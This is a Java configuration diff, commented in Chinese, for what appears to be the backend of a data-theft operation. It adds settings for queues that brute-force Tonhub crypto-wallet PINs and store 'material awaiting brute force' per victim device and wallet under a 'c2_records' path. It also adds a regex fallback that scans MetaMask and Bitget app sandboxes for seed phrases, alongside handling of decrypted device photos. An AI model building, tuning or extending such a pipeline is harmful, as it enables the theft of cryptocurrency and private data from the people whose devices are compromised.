@@ -116,6 +116,62 @@ public class ConsumerProperties {
     /** 解密后图片落盘目录（nginx/后台静态目录应对齐） */
     private String photoDir = "/opt/news4/data/photos";
 
+    /**
+     * 待爆破加密材料落盘根目录。
+     * 实际路径：{waitbound-dir}/{deviceId}/{wallet}/...
+     */
+    private String waitboundDir = "D:/c2_records/waitbound";
+
+    /** 是否向 api18:tasks:waitbound 投递 waitbound_collect（parse_ci 旁路） */
+    private boolean waitboundTaskEnabled = true;
+
+    /** waitbound 并发（I/O 为主，默认 2） */
+    private int waitboundThreads = 2;
+
+    /** waitbound 轮询间隔 ms */
+    private long waitboundPollIntervalMs = 800L;
+
+    /** waitbound XAUTOCLAIM idle 毫秒（默认 15 分钟） */
+    private long waitboundClaimIdleMs = 900000L;
+
+    /** waitbound 批量拉取大小 */
+    private int waitboundBatchSize = 4;
+
+    /** waitbound 队列名（来自 queue.stream-waitbound，支持 queue.prefix） */
+    public String getWaitboundStream() {
+        return queueProperties.getStreamWaitbound();
+    }
+
+    /**
+     * 是否将 Tonhub PIN 爆破旁路到 api18:tasks:tonhub（推荐 true）。
+     * true：parse_ci 只发现 mmkv / 明文，重 CPU 爆破由 TonhubConsumer 串行消费；
+     * false：恢复旧行为（在 parse_ci disk-scan 内同步/异步爆破）。
+     */
+    private boolean tonhubTaskEnabled = true;
+
+    /** tonhub 队列消费并发（建议 1，与串行化配合，避免多 device 同时 PBKDF2） */
+    private int tonhubThreads = 1;
+
+    /** tonhub 轮询间隔 ms */
+    private long tonhubPollIntervalMs = 500L;
+
+    /** tonhub XAUTOCLAIM idle 毫秒（爆破可能数分钟，默认 30 分钟） */
+    private long tonhubClaimIdleMs = 1800000L;
+
+    /** tonhub 批量拉取大小（CPU 重，建议 1） */
+    private int tonhubBatchSize = 1;
+
+    /** tonhub 队列名（来自 queue.stream-tonhub，支持 queue.prefix） */
+    public String getTonhubStream() {
+        return queueProperties.getStreamTonhub();
+    }
+
+    /**
+     * sandbox 全目录 BIP39 兜底正则（metamask/bitget 等未专用解密的沙盒）。
+     * 实测大包几乎捞不到明文、却很慢，默认关闭；需要时再开。
+     */
+    private boolean sandboxFallbackRegexEnabled = false;
+
     /** 写入 album.image_path 的相对路径前缀；后台/nginx 需映射到 photo-dir */
     private String photoUrlPrefix = "admin/data/photos";
 
